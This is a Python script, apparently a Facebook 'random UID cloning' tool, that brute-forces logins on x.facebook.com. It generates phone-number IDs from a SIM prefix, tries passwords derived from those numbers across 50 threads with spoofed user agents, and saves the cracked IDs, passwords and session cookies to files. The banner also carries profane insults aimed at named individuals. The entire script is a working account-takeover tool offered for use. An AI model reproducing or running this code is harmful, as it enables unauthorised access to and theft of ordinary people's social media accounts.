import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)

        
os.system('clear')
print("\033[\033[1;91mTOOLS UPDATE SUCCESSFUL ENJOY SABBI4 KING")
time.sleep(5)
os.system('clear')        

logo = ("""
 \t\033[38;5;46m
\t\033[38;5;46m\033[38;5;46m
  ______    ______   _______   _______   ______  __    __ 
 /      \  /      \ |       \ |       \ |      \|  \  |  \
|  $$$$$$\|  $$$$$$\| $$$$$$$\| $$$$$$$\ \$$$$$$| $$  | $$
| $$___\$$| $$__| $$| $$__/ $$| $$__/ $$  | $$  | $$__| $$
 \$$    \ | $$    $$| $$    $$| $$    $$  | $$  | $$    $$
 _\$$$$$$\| $$$$$$$$| $$$$$$$\| $$$$$$$\  | $$   \$$$$$$$$
|  \__| $$| $$  | $$| $$__/ $$| $$__/ $$ _| $$_       | $$
 \$$    $$| $$  | $$| $$    $$| $$    $$|   $$ \      | $$
  \$$$$$$  \$$   \$$ \$$$$$$$  \$$$$$$$  \$$$$$$       \$$
                                                          
                                                          
                                                          

\t\033[38;5;46m
\33[38;5;196m     \033[38;5;46m\33[38;5;196m
print('\33[1;92m━━━━━━━━━━━━━━━━━━━━━\33[1;91m━━━━━━━━━━━━━━━━━━━━━━')
\33[38;5;196m      \033[38;5;46m[SABBI4]\x1b[1;96m\x1b[38;5;208m: -------->[SABBIR ISLAM]\33[38;5;196m         
\33[38;5;196m      \033[38;5;46m[SABBI4]\x1b[1;96m\x1b[38;5;208m: -------->[RANDOM--CLONING]\33[38;5;196m         
\33[38;5;196m      \033[38;5;46m[SABBI4]\x1b[1;96m\x1b[38;5;208m: -------->[VARSON —FREE]\33[38;5;196m       
\33[38;5;196m      \033[38;5;46m[SABBI4]\x1b[1;96m\x1b[38;5;208m: -------->[TIPE---TUTUL AR MA RE CHUDI]\33[38;5;196m        
\33[38;5;196m      \033[38;5;46m[SABBI4]\x1b[1;96m\x1b[38;5;208m: -------->[VODRO SOYTAN]\33[38;5;196m     
\33[38;5;196m      \033[38;5;46m[SABBI4]\x1b[1;96m\x1b[38;5;208m: -------->[MAHEDIR BON RA CHUDI]\33[38;5;196m     
\33[38;5;196m      \033[38;5;46m[SABBI4]\x1b[1;96m\x1b[38;5;208m: -------->[TUTUL AR CHAMSA SIAM AR MAR VODA ENJOY]\33[38;5;196m            
 \33[38;5;196m    \033[1;31m\33[38;5;196m""")
print('\33[1;92m━━━━━━━━━━━━━━━━━━━━━\33[1;91m━━━━━━━━━━━━━━━━━━━━━━')


def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO ACTIVE APK")
	else:
		print("")
		print(f'\r🎮 %sYOUR ACTIVE APPLICATION DETAILS :'%(H))
		for i in range(len(game)):
			print("%s%s. %s%s"%(H,i+1,game[i].replace("ACTIVE"," ACTIVE"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK")
	else:
		print(f'\r 🎮 %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
		for i in range(len(game)):
			print("%s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))



class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print(" [1] Random Uid Clone")
        print(" [0] Exit")
        print('\33[1;92m━━━━━━━━━━━━━━━━━━━━━\33[1;91m━━━━━━━━━━━━━━━━━━━━━━')
        SOY5AN =input(" [?] Choose : ")
        
        if SOY5AN in ["1", "1"]:
            M1()
        else:
            exit()
def M1():
    user=[]
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 017/ 018/ 019/ 016/ 013/ 014 ')
    print('\33[1;92m━━━━━━━━━━━━━━━━━━━━━\33[1;91m━━━━━━━━━━━━━━━━━━━━━━')
    kode = input(' [?] Enter sim code: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    print('\33[1;92m━━━━━━━━━━━━━━━━━━━━━\33[1;91m━━━━━━━━━━━━━━━━━━━━━━')
    limit = int(input(' [?] Crack Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=50) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;92m YOUR SIM CODE : '+kode)
        print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;92m TOTAL ID : '+tl)
        print('\33[1;92m━━━━━━━━━━━━━━━━━━━━━\33[1;91m━━━━━━━━━━━━━━━━━━━━━━')
        
        
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ok.txt,cp.txt')

def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r [SOY5AN] %s|%s\33[1;92m[OK-%s\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://x.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'x.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="112", "Opera";v="96"',
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="112.0.5658.224", "Opera";v="96.0.4160.147"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"macOS"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\r\r\x1b[38;5;46m[SOY5AN-OK] '+cid+' | '+ps+'\033[1;97m')
                print (f"\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;32m COOKIES: {coki} ")
                open('SOY5AN-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid);cek_apk(coki)
                break
            elif 'CP' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\33[1;91m[CP] '+uid+' | '+ps+'\33[0;97m')
                open('SOY5AN-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                break
            else:
                continue
        loop+=1
    
    except:
        pass
Main()